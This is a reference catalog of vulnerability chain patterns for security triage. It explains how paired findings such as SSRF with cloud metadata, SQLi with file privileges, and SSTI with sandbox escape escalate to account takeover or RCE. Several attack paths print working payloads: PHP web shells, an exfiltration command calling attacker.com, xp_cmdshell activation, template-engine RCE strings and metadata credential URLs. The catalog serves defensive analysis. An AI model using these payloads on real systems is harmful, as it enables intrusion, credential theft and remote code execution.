# Vulnerability Chain Patterns

Comprehensive catalog of known vulnerability chain patterns. Each pattern describes how two or more lower-severity findings combine into a higher-impact attack.

## How to Use This Reference

During chain analysis, check every pair of validated findings against these patterns. Match by vulnerability type, not by exact rule ID. A finding's `vuln_type` field maps to the component types listed here.

Patterns are bidirectional unless noted — the order of discovery doesn't matter, only the exploitation order (which is specified in each pattern).

## Critical-Impact Chains

### IDOR + Information Disclosure → Account Takeover

**Components**: Access control flaw (IDOR, BAC, BOLA) + data leak (INFO-DISC, ERROR-LEAK)

**Connection mechanism**: The information disclosure leaks data needed to exploit the IDOR (valid user IDs, internal object references, email addresses, security question answers), or the IDOR exposes data that enables account takeover (password reset tokens, API keys, session identifiers).

**Combined attack path**:
1. Exploit info disclosure to enumerate valid user identifiers or internal references
2. Use harvested identifiers to exploit IDOR on sensitive endpoints
3. Access or modify victim account data (profile, credentials, payment info)

**Effective severity**: Critical (mass account takeover potential)

**Real-world parallels**: Many HackerOne reports combine BOLA with info disclosure for account takeover. Common in APIs where user enumeration is trivial and object-level authorization is missing.

---

### SSRF + Cloud Metadata → Infrastructure Compromise

**Components**: Server-side request forgery (SSRF) + cloud environment (AWS/GCP/Azure)

**Connection mechanism**: SSRF allows requests to the cloud metadata endpoint (169.254.169.254 for AWS/GCP, 169.254.169.254 or metadata.google.internal for GCP, 169.254.169.254 for Azure IMDS). The metadata endpoint returns IAM credentials, database passwords, and service account tokens.

**Combined attack path**:
1. Exploit SSRF to request `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`
2. Extract temporary IAM credentials (AccessKeyId, SecretAccessKey, Token)
3. Use credentials to access cloud resources (S3 buckets, databases, other services)
4. Escalate through cloud IAM depending on attached policies

**Effective severity**: Critical (infrastructure-level compromise)

**Detection indicators**: Application makes outbound HTTP requests with user-controlled URLs. Target runs on AWS EC2, GCP Compute, or Azure VM. No IMDSv2 enforcement (AWS) or metadata concealment (GCP).

---

### Open Redirect + OAuth → Token Theft / Account Takeover

**Components**: Open redirect (OPEN-REDIR) + OAuth/OIDC flow

**Connection mechanism**: The OAuth flow redirects to a user-controlled URL (via open redirect on a whitelisted domain), leaking the authorization code or access token in the redirect URL.

**Combined attack path**:
1. Identify open redirect on a domain whitelisted in the OAuth client configuration
2. Craft OAuth authorization URL with `redirect_uri` pointing to the open redirect
3. Open redirect forwards victim (with auth code in URL) to attacker-controlled server
4. Attacker exchanges stolen authorization code for access token
5. Access victim's account via the stolen token

**Effective severity**: Critical (account takeover)

**Prerequisites**: OAuth client uses authorization code flow. The redirect domain is in the OAuth whitelist. Open redirect is on the same domain or a whitelisted subdomain.

---

### XSS + CSRF → Authenticated Action Execution

**Components**: Cross-site scripting (XSS, stored or reflected) + cross-site request forgery (CSRF) or state-changing actions

**Connection mechanism**: XSS executes JavaScript in the victim's browser session, bypassing CSRF tokens (since the script runs in the same origin and can read tokens). The script performs state-changing actions as the victim.

**Combined attack path**:
1. Inject XSS payload (stored or via reflected link)
2. XSS payload reads CSRF token from the DOM
3. Payload constructs and submits state-changing requests with valid CSRF token
4. Actions execute with victim's full privileges (password change, email change, data deletion, admin actions if victim is admin)

**Effective severity**: Critical (arbitrary authenticated actions)

**Note**: Even without explicit CSRF vulnerabilities, XSS can perform any action the victim can. CSRF tokens are irrelevant when the attacker has JavaScript execution in the same origin.

---

### Path Traversal + File Upload → Remote Code Execution

**Components**: Path traversal (PATH-TRAV, LFI) + unrestricted file upload (FILE-UPLOAD)

**Connection mechanism**: File upload allows placing a file on the server. Path traversal controls where the file is stored, allowing placement in a web-accessible or executable directory.

**Combined attack path**:
1. Upload a file containing executable payload (web shell, server-side script)
2. Exploit path traversal in the storage path to place the file in a web-accessible directory (e.g., `../../public/uploads/shell.php`)
3. Request the uploaded file via its web-accessible URL to trigger execution
4. Achieve remote code execution on the server

**Effective severity**: Critical (RCE)

**Variants**: Also applies when path traversal is in a separate read operation — upload a config file or template that gets processed by the server.

---

### Information Disclosure + Password Reset → Account Takeover

**Components**: Data leak (INFO-DISC, ERROR-LEAK, LOG-LEAK) + password reset flow flaw (AUTH, RESET)

**Connection mechanism**: Information disclosure reveals data that undermines the password reset flow — reset tokens, security question answers, email addresses, or predictable token patterns.

**Combined attack path**:
1. Exploit info disclosure to obtain reset tokens, user emails, or security answers
2. Initiate password reset for target account
3. Use disclosed information to complete the reset (answer security questions, use leaked token, intercept reset email via disclosed email address)
4. Set new password, achieving account takeover

**Effective severity**: Critical (account takeover)

---

### Race Condition + Business Logic → Financial Fraud

**Components**: Race condition (RACE, TOCTOU) + financial/business operation (BIZ-LOGIC)

**Connection mechanism**: Race condition in a financial operation (payment, transfer, coupon redemption, balance check-then-deduct) allows the same operation to be executed multiple times before the first completes.

**Combined attack path**:
1. Identify financial operation with check-then-act pattern
2. Send multiple concurrent requests exploiting the race window
3. Each request passes the check (sufficient balance, valid coupon) before any deduction occurs
4. All requests complete, resulting in multiple deductions from one balance, multiple coupon redemptions, or duplicate transfers

**Effective severity**: Critical (direct financial impact)

---

### SQLi + Privilege Data → Privilege Escalation

**Components**: SQL injection (SQLI, NOSQLI) + privilege/role data in database

**Connection mechanism**: SQL injection provides read or write access to the database. If the same database stores user roles, permissions, or privilege levels, the attacker can escalate from data read to privilege escalation.

**Combined attack path (read)**:
1. Exploit SQLi to read role/permission tables
2. Identify admin accounts or privilege escalation paths
3. Extract admin credentials (password hashes, API keys, session tokens)
4. Authenticate as admin

**Combined attack path (write)**:
1. Exploit SQLi to write to role/permission tables
2. Elevate own account's role to admin
3. Access admin functionality with elevated privileges

**Effective severity**: Critical (privilege escalation to admin)

---

### SSRF + Internal API → Internal Service Compromise

**Components**: Server-side request forgery (SSRF) + internal services without authentication

**Connection mechanism**: SSRF allows making requests to internal network addresses. Internal services often lack authentication because they assume network-level isolation provides security.

**Combined attack path**:
1. Exploit SSRF to scan internal network (common ports: 80, 443, 8080, 8443, 6379, 5432, 3306, 27017)
2. Identify internal services (admin panels, databases, caches, message queues)
3. Access internal services directly through SSRF — read data from Redis, query internal APIs, access admin interfaces
4. Exfiltrate data or modify internal state

**Effective severity**: Critical (internal network compromise)

---

### CRLF Injection + SSRF → Redis Command Injection → RCE

**Components**: CRLF injection (CRLF, HEADER-INJ) + Server-side request forgery (SSRF)

**Connection mechanism**: CRLF injection in a URL passed through an SSRF endpoint allows injecting raw Redis/Memcached protocol commands. The SSRF reaches an internal Redis instance, and CRLF sequences break out of the HTTP protocol into Redis commands.

**Combined attack path**:
1. Identify SSRF endpoint that makes requests to internal services
2. Inject CRLF characters (`%0d%0a`) into the URL to break out of HTTP request
3. Inject Redis commands after CRLF: `SET shell "<?php system($_GET['cmd']); ?>"`
4. Use Redis `CONFIG SET dir /var/www/html` and `CONFIG SET dbfilename shell.php`
5. Trigger Redis SAVE to write web shell to disk
6. Access web shell for RCE

**Effective severity**: Critical (RCE via cache protocol injection)

**Detection indicators**: SSRF with URL parameter that does not strip CRLF characters. Internal Redis/Memcached reachable from application server without authentication. Application uses HTTP libraries that do not reject CRLF in URLs.

**Real-world parallels**: GitLab SSRF to Redis RCE (HackerOne #441090, $33,750 bounty). Multiple Shopify and GitHub reports involving CRLF + SSRF chains.

---

### SQL Injection + File Read/Write Privileges → RCE

**Components**: SQL injection (SQLI) + database file system access (FILE privilege, COPY, xp_cmdshell)

**Connection mechanism**: SQL injection with elevated database privileges enables reading or writing files on the database server's filesystem, or direct command execution through database-specific features.

**Combined attack path (MySQL)**:
1. Exploit SQL injection to confirm FILE privilege: `SELECT LOAD_FILE('/etc/passwd')`
2. Write web shell via `SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php'`
3. Access web shell for RCE

**Combined attack path (PostgreSQL)**:
1. Exploit SQL injection to execute OS commands: `COPY (SELECT '') TO PROGRAM 'id'`
2. Or create a PL/Python function for persistent command execution
3. Exfiltrate via `COPY ... TO PROGRAM 'curl attacker.com/?data=$(command)'`

**Combined attack path (MSSQL)**:
1. Enable xp_cmdshell: `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE`
2. Execute commands: `EXEC xp_cmdshell 'whoami'`
3. Establish reverse shell or exfiltrate data

**Effective severity**: Critical (RCE or arbitrary file read/write)

**Detection indicators**: SQL injection exists. Database user has FILE privilege (MySQL), is superuser (PostgreSQL), or is sysadmin (MSSQL). Web root is writable by database process. `xp_cmdshell` is available or can be enabled.

**Real-world parallels**: Common escalation path in CTF competitions and real-world pentests. Multiple HackerOne reports demonstrate SQLi → file write → RCE.

---

### SSRF + PDF/Image Generator → Internal File Read

**Components**: Server-side request forgery (SSRF) + server-side document rendering (PDF, image, HTML-to-PDF)

**Connection mechanism**: Application uses a headless browser or HTML-to-PDF converter (wkhtmltopdf, Puppeteer, WeasyPrint, Chrome headless) to render user-supplied HTML. The renderer fetches resources server-side, acting as an SSRF vector that can read internal files and access internal services.

**Combined attack path**:
1. Identify PDF/image generation feature that accepts HTML input (invoice generators, report exporters, ticket renderers)
2. Inject HTML with server-side fetch: `<iframe src="file:///etc/passwd">` or `<img src="http://169.254.169.254/latest/meta-data/">`
3. Renderer fetches the resource server-side and includes content in the generated document
4. Download the generated PDF/image to read internal file contents or cloud metadata

**Effective severity**: Critical (internal network access + file read)

**Detection indicators**: Application generates PDFs or images from user-supplied HTML or URLs. Uses wkhtmltopdf, Puppeteer, WeasyPrint, Prince, or Chrome headless. User controls any part of the HTML template (even partial — header, footer, filename, description fields).

**Real-world parallels**: Extremely common in bug bounty programs. Invoice generators, report exporters, and ticket systems are frequent targets. Multiple $10K+ bounties for HTML-to-PDF SSRF.

---

### LFI + Log Poisoning → RCE

**Components**: Local file inclusion (LFI, PATH-TRAV) + log file write with user-controlled content

**Connection mechanism**: LFI allows reading arbitrary files including log files. If the application logs user-controlled data (User-Agent, username, request parameters) without sanitization, an attacker can inject code into the log file and then include it via LFI to achieve code execution.

**Combined attack path**:
1. Identify LFI vulnerability (e.g., `?page=../../../etc/passwd`)
2. Determine log file location (e.g., `/var/log/apache2/access.log`, `/var/log/nginx/error.log`)
3. Send request with PHP payload in User-Agent header: `<?php system($_GET['cmd']); ?>`
4. Include the log file via LFI: `?page=../../../var/log/apache2/access.log&cmd=id`
5. PHP engine executes the payload from the log file

**Effective severity**: Critical (RCE from two medium-severity findings)

**Detection indicators**: LFI or path traversal vulnerability exists. Application runs PHP (or other language that executes included files). Log files are readable by the web server process. Application logs user-controlled headers or parameters without sanitization.

**Real-world parallels**: Classic web exploitation technique. Common in legacy PHP applications. Also applies to session file inclusion (`/tmp/sess_<PHPSESSID>`) and `/proc/self/environ` inclusion.

---

### Mass Assignment + Privilege Field → Privilege Escalation

**Components**: Mass assignment (MASS-ASSIGN) + role or privilege field in the data model

**Connection mechanism**: The application binds request parameters directly to model attributes without a whitelist. The data model includes a privilege field (role, is_admin, permissions, access_level) that can be set through mass assignment.

**Combined attack path**:
1. Identify endpoint that creates or updates user/account objects (registration, profile update, settings)
2. Inspect the data model or API response for privilege-related fields (role, is_admin, is_staff, permissions, group_id)
3. Send request with extra parameter: `{"username": "attacker", "email": "a@b.com", "role": "admin"}`
4. Application binds all parameters including the privilege field
5. Attacker account now has admin/elevated privileges

**Effective severity**: Critical (privilege escalation to admin)

**Detection indicators**: Application uses mass assignment (ActiveRecord, Django ModelForm without `fields`, Express with body directly to model). Data model has role/privilege fields. No explicit parameter whitelist or strong parameters enforcement.

**Real-world parallels**: GitHub mass assignment incident (2012) — Egor Homakov escalated privileges via mass assignment on public key model. Common in Rails, Django, and Express applications.

---

### SSTI + Sandbox Escape → RCE

**Components**: Server-side template injection (SSTI) + template engine sandbox/restriction bypass

**Connection mechanism**: SSTI allows injecting template syntax that is evaluated server-side. Modern template engines restrict available objects, but MRO (Method Resolution Order) traversal, reflection, and known gadget chains can escape the sandbox to achieve arbitrary code execution.

**Combined attack path (Jinja2/Python)**:
1. Confirm SSTI: `{{7*7}}` → `49`
2. Access object class hierarchy: `{{''.__class__.__mro__[1].__subclasses__()}}`
3. Find subprocess or os module in subclasses
4. Execute arbitrary commands: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`

**Combined attack path (Freemarker/Java)**:
1. Confirm SSTI: `${7*7}` → `49`
2. Execute via built-in: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
3. Or use ObjectConstructor: `${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.Runtime").exec("id")}`

**Combined attack path (Twig/PHP)**:
1. Confirm SSTI: `{{7*7}}` → `49`
2. Twig 1.x: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
3. Twig 3.x (with allowed functions): `{{['id']|filter('system')}}`

**Effective severity**: Critical (RCE via template sandbox escape)

**Detection indicators**: User input reaches template rendering. Template engine is Jinja2, Freemarker, Twig, Velocity, Mako, or Pebble. Application uses server-side rendering with dynamic templates. Error messages reveal template engine name/version.

**Real-world parallels**: Uber SSTI (Jinja2 → RCE, HackerOne). Shopify Liquid SSTI. Multiple Freemarker SSTI reports in Java applications. Orange Tsai's template injection research.

## High-Impact Chains

### XSS + Session → Session Hijacking

**Components**: Cross-site scripting (XSS) + accessible session tokens (SESSION, COOKIE)

**Connection mechanism**: XSS executes in the victim's browser and accesses session cookies (if HttpOnly is not set) or session tokens stored in localStorage/sessionStorage.

**Combined attack path**:
1. Inject XSS payload
2. Payload reads session cookie or token from storage
3. Payload exfiltrates token to attacker-controlled server
4. Attacker uses stolen session token to impersonate victim

**Effective severity**: High → Critical (depends on session scope — admin sessions are critical)

**Mitigating factors**: HttpOnly cookies prevent cookie theft via XSS (but XSS can still perform actions directly). SameSite cookie attributes limit cross-origin scenarios.

---

### SSTI + Error Verbosity → Escalated Template Injection

**Components**: Server-side template injection (SSTI) + verbose error messages (INFO-DISC, ERROR-LEAK)

**Connection mechanism**: SSTI is often blind or limited without knowledge of the template engine and its internals. Verbose error messages reveal the template engine, version, available objects, and class hierarchy — enabling escalation from basic injection to RCE.

**Combined attack path**:
1. Identify SSTI via basic payload injection (`{{7*7}}`)
2. Use verbose error messages to identify template engine and available objects
3. Craft engine-specific RCE payload using disclosed class hierarchy
4. Achieve remote code execution

**Effective severity**: High → Critical (RCE via informed SSTI)

---

### XXE + SSRF → Internal File Read / Network Scan

**Components**: XML external entity injection (XXE) + internal network access

**Connection mechanism**: XXE can make outbound requests (similar to SSRF) and read local files. Combined with knowledge of internal network layout, XXE becomes a tool for internal reconnaissance and data exfiltration.

**Combined attack path**:
1. Exploit XXE to read local files (`file:///etc/passwd`, configuration files)
2. Extract internal hostnames, IP addresses, and service configurations from local files
3. Use XXE's URL fetching to access internal services discovered in step 2
4. Exfiltrate internal service data through out-of-band XXE channels

**Effective severity**: High → Critical (depends on internal service sensitivity)

---

### CSRF + Password Change → Account Takeover

**Components**: Cross-site request forgery (CSRF) + password change without current password verification

**Connection mechanism**: The password change endpoint doesn't require the current password (or the CSRF allows bypassing it). CSRF forces the victim's browser to submit a password change request.

**Combined attack path**:
1. Craft CSRF payload targeting the password change endpoint
2. Deliver to victim (email link, malicious page, stored XSS)
3. Victim's browser submits password change request with attacker's chosen password
4. Attacker logs in with the new password

**Effective severity**: High → Critical (account takeover)

## Medium-Impact Chains

### Info Disclosure + Brute Force → Credential Stuffing

**Components**: Information disclosure (user enumeration, email leak) + missing rate limiting (RATE-LIMIT)

**Connection mechanism**: User enumeration reveals valid usernames/emails. Missing rate limiting allows unlimited login attempts.

**Combined attack path**:
1. Enumerate valid usernames or email addresses via info disclosure
2. Run credential stuffing attacks against known-valid accounts
3. No rate limiting prevents the attack from being blocked

**Effective severity**: Medium → High (credential compromise at scale)

---

### Log Injection + Log Viewing → Stored XSS in Admin

**Components**: Log injection (LOG-INJ) + admin log viewer without sanitization

**Connection mechanism**: Attacker injects HTML/JavaScript into log messages. Admin views logs through a web interface that renders log content without sanitization.

**Combined attack path**:
1. Inject XSS payload into a logged field (username, user-agent, referrer)
2. Admin views logs through web-based log viewer
3. XSS executes in admin's browser session
4. Attacker gains admin session or performs admin actions

**Effective severity**: Medium → High (admin compromise via log viewer)

## Chain Evaluation Criteria

When evaluating whether two findings form a chain:

### Must Have
- Both findings independently validated
- Plausible connection (shared application context, reachable from similar attack position)
- Combined impact exceeds individual impacts

### Strengthens Chain
- Findings are in the same application or service
- Data flow between findings is direct (output of A feeds input of B)
- Both findings are exploitable from the same auth level
- Known real-world examples of the pattern

### Weakens Chain
- Findings are in completely separate applications with no integration
- Connection requires additional undiscovered vulnerabilities
- Timing constraints make sequential exploitation impractical
- Strong mitigations exist between the two exploitation steps

### Disqualifies Chain
- Either component finding was rejected during validation
- Connection is purely theoretical with no concrete path
- Exploitation of the chain requires higher privileges than it achieves
- The combined impact is not meaningfully greater than the highest individual impact
